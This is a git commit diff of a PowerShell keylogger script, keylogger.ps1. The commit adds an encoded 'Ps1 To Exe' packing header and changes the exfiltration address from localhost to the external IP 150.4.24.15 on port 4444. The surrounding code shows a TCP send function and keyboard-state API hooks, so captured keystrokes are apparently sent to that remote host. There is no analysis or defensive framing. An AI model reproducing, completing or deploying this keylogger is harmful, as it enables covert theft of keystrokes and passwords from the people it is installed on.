17ffe2d6a122ac84f4a3b4a709fc6a3a94af2465
the-alias <39953366+the-alias@users.noreply.github.com>
2023-07-19 17:09:26 +0300

    update

--- keylogger.ps1
+++ keylogger.ps1
@@ -1,3 +1,36 @@
+﻿##[Ps1 To Exe]
+##
+##Kd3HDZOFADWE8uK1
+##Nc3NCtDXThU=
+##Kd3HFJGZHWLWoLaVvnQnhQ==
+##LM/RF4eFHHGZ7/K1
+##K8rLFtDXTiW5
+##OsHQCZGeTiiZ4dI=
+##OcrLFtDXTiW5
+##LM/BD5WYTiiZ4tI=
+##McvWDJ+OTiiZ4tI=
+##OMvOC56PFnzN8u+Vs1Q=
+##M9jHFoeYB2Hc8u+Vs1Q=
+##PdrWFpmIG2HcofKIo2QX
+##OMfRFJyLFzWE8uK1
+##KsfMAp/KUzWJ0g==
+##OsfOAYaPHGbQvbyVvnQX
+##LNzNAIWJGmPcoKHc7Do3uAuO
+##LNzNAIWJGnvYv7eVvnQX
+##M9zLA5mED3nfu77Q7TV64AuzAgg=
+##NcDWAYKED3nfu77Q7TV64AuzAgg=
+##OMvRB4KDHmHQvbyVvnQX
+##P8HPFJGEFzWE8tI=
+##KNzDAJWHD2fS8u+Vgw==
+##P8HSHYKDCX3N8u+Vgw==
+##LNzLEpGeC3fMu77Ro2k3hQ==
+##L97HB5mLAnfMu77Ro2k3hQ==
+##P8HPCZWEGmaZ7/K1
+##L8/UAdDXTlaDjofG5iZk2X79R3oXSsCIsqKo1L23+vPgtCLeTIgHBFl2nyfAD06kF/cKUJU=
+##Kc/BRM3KXhU=
+##
+##
+##fd6a9f26a06ea3bc99616d4851b372ba
 Function Send-TCPMessage { 
     Param ( 
             [Parameter(Mandatory=$true, Position=0)]
@@ -64,7 +97,7 @@ Add-Type -MemberDefinition $Sig3 -Name GetKBS -Namespace PsOneApi
 # Translate key to unicode
 Add-Type -MemberDefinition $Sig4 -Name ToUni -Namespace PsOneApi
 $file = ".\out.txt"
-$ret_addr = "127.0.0.1"
+$ret_addr = "150.4.24.15"
 $ret_port = 4444
 while($true){
     Start-Sleep -Milliseconds 5
